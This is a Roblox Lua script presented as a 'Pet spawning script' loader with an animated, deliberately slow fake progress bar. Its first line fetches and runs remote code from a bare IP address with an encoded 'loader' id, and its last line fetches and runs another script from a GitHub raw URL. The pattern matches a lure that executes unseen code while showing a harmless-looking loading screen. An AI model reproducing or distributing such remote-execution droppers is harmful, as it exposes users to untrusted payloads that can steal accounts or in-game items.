loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjA0NDE1NzU1LTk3ZjEtNGIzNC05MGQwLTNlZTA5YzBiZTkxOCIsImtpbmQiOiJsb2FkZXIifQ"))()
--// Modern Loader GUI (Roblox Lua)
--// Drop into a LocalScript (StarterPlayerScripts, StarterGui, etc.)

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--========================
-- SETTINGS (edit these)
--========================
local LOAD_DURATION = 110.0 -- âœ… total time (seconds)
local FADE_IN_TIME  = 0.45
local FADE_OUT_TIME = 0.50

local STATUS_MESSAGES = {
	"Initializing...",
	"Injecting...",
	"Loading...",
	"Preparing assets...",
	"Finalizing...",
	"Completing..."
}

-- A "pace curve" that makes the bar speed up / slow down at multiple places.
-- Each point is {time = 0..1, progress = 0..1}. Must start at 0,0 and end at 1,1.
-- Feel free to tweak these values to change the rhythm.
local PACE_POINTS = {
	{time = 0.00, progress = 0.00},
	{time = 0.08, progress = 0.05}, -- slow start
	{time = 0.18, progress = 0.22}, -- speed up
	{time = 0.32, progress = 0.30}, -- slow down
	{time = 0.44, progress = 0.55}, -- speed up
	{time = 0.58, progress = 0.62}, -- slow down
	{time = 0.74, progress = 0.85}, -- speed up
	{time = 0.88, progress = 0.92}, -- slow down
	{time = 1.00, progress = 1.00},
}

--========================
-- Helpers
--========================
local function tween(instance, tweenInfo, props)
	local t = TweenService:Create(instance, tweenInfo, props)
	t:Play()
	return t
end

local function setGroupTransparency(rootGui, alpha)
	for _, d in ipairs(rootGui:GetDescendants()) do
		if d:IsA("Frame") then
			d.BackgroundTransparency = alpha
		elseif d:IsA("TextLabel") then
			d.TextTransparency = alpha
		elseif d:IsA("UIStroke") then
			d.Transparency = alpha
		elseif d:IsA("ImageLabel") then
			d.ImageTransparency = alpha
		end
	end
end

local function clamp01(x)
	if x < 0 then return 0 end
	if x > 1 then return 1 end
	return x
end

-- Piecewise linear mapping: timeNormalized -> progressNormalized using PACE_POINTS
local function progressFromTime(tn)
	tn = clamp01(tn)

	for i = 1, (#PACE_POINTS - 1) do
		local a = PACE_POINTS[i]
		local b = PACE_POINTS[i + 1]
		if tn >= a.time and tn <= b.time then
			local span = (b.time - a.time)
			if span <= 0 then return a.progress end
			local u = (tn - a.time) / span
			return a.progress + (b.progress - a.progress) * u
		end
	end

	return 1
end

--========================
-- Build UI
--========================
local gui = Instance.new("ScreenGui")
gui.Name = "ModernLoaderGui"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = playerGui

local dim = Instance.new("Frame")
dim.Name = "Dim"
dim.Size = UDim2.fromScale(1, 1)
dim.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
dim.BackgroundTransparency = 1
dim.Parent = gui

local container = Instance.new("Frame")
container.Name = "Container"
container.AnchorPoint = Vector2.new(0.5, 0.5)
container.Position = UDim2.fromScale(0.5, 0.5)
container.Size = UDim2.fromOffset(520, 220)
container.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
container.BackgroundTransparency = 1
container.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 18)
corner.Parent = container

local stroke = Instance.new("UIStroke")
stroke.Thickness = 2
stroke.Transparency = 1
stroke.LineJoinMode = Enum.LineJoinMode.Round
stroke.Parent = container

local strokeGradient = Instance.new("UIGradient")
strokeGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0.00, Color3.fromRGB(120, 210, 255)),
	ColorSequenceKeypoint.new(0.50, Color3.fromRGB(170, 120, 255)),
	ColorSequenceKeypoint.new(1.00, Color3.fromRGB(120, 210, 255)),
})
strokeGradient.Rotation = 0
strokeGradient.Parent = stroke

local highlight = Instance.new("Frame")
highlight.Name = "Highlight"
highlight.Size = UDim2.new(1, -10, 1, -10)
highlight.Position = UDim2.fromOffset(5, 5)
highlight.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
highlight.BackgroundTransparency = 1
highlight.Parent = container

local highlightCorner = Instance.new("UICorner")
highlightCorner.CornerRadius = UDim.new(0, 14)
highlightCorner.Parent = highlight

local highlightGrad = Instance.new("UIGradient")
highlightGrad.Transparency = NumberSequence.new({
	NumberSequenceKeypoint.new(0, 0.88),
	NumberSequenceKeypoint.new(1, 1.00),
})
highlightGrad.Rotation = 25
highlightGrad.Parent = highlight

local title = Instance.new("TextLabel")
title.Name = "Title"
title.BackgroundTransparency = 1
title.Size = UDim2.new(1, -40, 0, 44)
title.Position = UDim2.fromOffset(20, 18)
title.Font = Enum.Font.GothamSemibold
title.Text = "Pet spawning script"
title.TextSize = 22
title.TextXAlignment = Enum.TextXAlignment.Left
title.TextColor3 = Color3.fromRGB(235, 235, 245)
title.TextTransparency = 1
title.Parent = container

local sub = Instance.new("TextLabel")
sub.Name = "Sub"
sub.BackgroundTransparency = 1
sub.Size = UDim2.new(1, -40, 0, 22)
sub.Position = UDim2.fromOffset(20, 54)
sub.Font = Enum.Font.Gotham
sub.Text = "Please wait while we set things up..."
sub.TextSize = 14
sub.TextXAlignment = Enum.TextXAlignment.Left
sub.TextColor3 = Color3.fromRGB(170, 170, 185)
sub.TextTransparency = 1
sub.Parent = container

local barTrack = Instance.new("Frame")
barTrack.Name = "BarTrack"
barTrack.Size = UDim2.new(1, -40, 0, 12)
barTrack.Position = UDim2.fromOffset(20, 110)
barTrack.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
barTrack.BackgroundTransparency = 1
barTrack.Parent = container

local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(0, 999)
barCorner.Parent = barTrack

local barFill = Instance.new("Frame")
barFill.Name = "BarFill"
barFill.Size = UDim2.fromScale(0, 1)
barFill.Position = UDim2.fromScale(0, 0)
barFill.BackgroundColor3 = Color3.fromRGB(130, 220, 255)
barFill.BackgroundTransparency = 1
barFill.Parent = barTrack

local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(0, 999)
fillCorner.Parent = barFill

local fillGrad = Instance.new("UIGradient")
fillGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0.0, Color3.fromRGB(120, 210, 255)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(170, 120, 255)),
	ColorSequenceKeypoint.new(1.0, Color3.fromRGB(120, 210, 255)),
})
fillGrad.Rotation = 0
fillGrad.Parent = barFill

local status = Instance.new("TextLabel")
status.Name = "Status"
status.BackgroundTransparency = 1
status.Size = UDim2.new(1, -40, 0, 26)
status.Position = UDim2.fromOffset(20, 130)
status.Font = Enum.Font.Gotham
status.Text = STATUS_MESSAGES[1]
status.TextSize = 14
status.TextXAlignment = Enum.TextXAlignment.Left
status.TextColor3 = Color3.fromRGB(190, 190, 205)
status.TextTransparency = 1
status.Parent = container

--========================
-- Animate In
--========================
setGroupTransparency(gui, 1)

tween(dim, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
	BackgroundTransparency = 0.35
})
tween(container, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
	BackgroundTransparency = 0
})
tween(highlight, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
	BackgroundTransparency = 0
})
tween(stroke, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
	Transparency = 0.15
})
tween(title, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
	TextTransparency = 0
})
tween(sub, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
	TextTransparency = 0.05
})
tween(barTrack, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
	BackgroundTransparency = 0
})
tween(barFill, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
	BackgroundTransparency = 0
})
tween(status, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
	TextTransparency = 0.05
})

--========================
-- Fancy glow rotations
--========================
local alive = true
local conn = RunService.RenderStepped:Connect(function(dt)
	if not alive then return end
	strokeGradient.Rotation = (strokeGradient.Rotation + dt * 90) % 360
	fillGrad.Rotation = (fillGrad.Rotation + dt * 120) % 360
	local pulse = (math.sin(tick() * 2.2) + 1) * 0.5
	stroke.Transparency = 0.10 + pulse * 0.22
end)

--========================
-- Progress + status cycling (non-linear pacing)
--========================
local startTime = tick()
local statusIndex = 1
local statusChangeInterval = LOAD_DURATION / math.max(#STATUS_MESSAGES, 1)
local nextStatusAt = startTime + statusChangeInterval

while true do
	local elapsed = tick() - startTime
	local tn = elapsed / LOAD_DURATION
	if tn >= 1 then
		barFill.Size = UDim2.fromScale(1, 1)
		break
	end

	local pn = progressFromTime(tn)
	barFill.Size = UDim2.fromScale(pn, 1)

	local now = tick()
	if now >= nextStatusAt and statusIndex < #STATUS_MESSAGES then
		statusIndex += 1
		status.Text = STATUS_MESSAGES[statusIndex]
		nextStatusAt = now + statusChangeInterval
	end

	task.wait(0.03)
end

status.Text = "Completed."

--========================
-- Fade Out + Finish
--========================
alive = false
if conn then conn:Disconnect() end

local fadeInfo = TweenInfo.new(FADE_OUT_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.In)

tween(dim, fadeInfo, { BackgroundTransparency = 1 })
tween(container, fadeInfo, { BackgroundTransparency = 1 })
tween(highlight, fadeInfo, { BackgroundTransparency = 1 })
tween(stroke, fadeInfo, { Transparency = 1 })
tween(title, fadeInfo, { TextTransparency = 1 })
tween(sub, fadeInfo, { TextTransparency = 1 })
tween(barTrack, fadeInfo, { BackgroundTransparency = 1 })
tween(barFill, fadeInfo, { BackgroundTransparency = 1 })
tween(status, fadeInfo, { TextTransparency = 1 })

task.wait(FADE_OUT_TIME + 0.05)
gui:Destroy()

loadstring(game:HttpGet("https://raw.githubusercontent.com/wweeweelala/dwetyiu7g/refs/heads/main/petspawn"))()

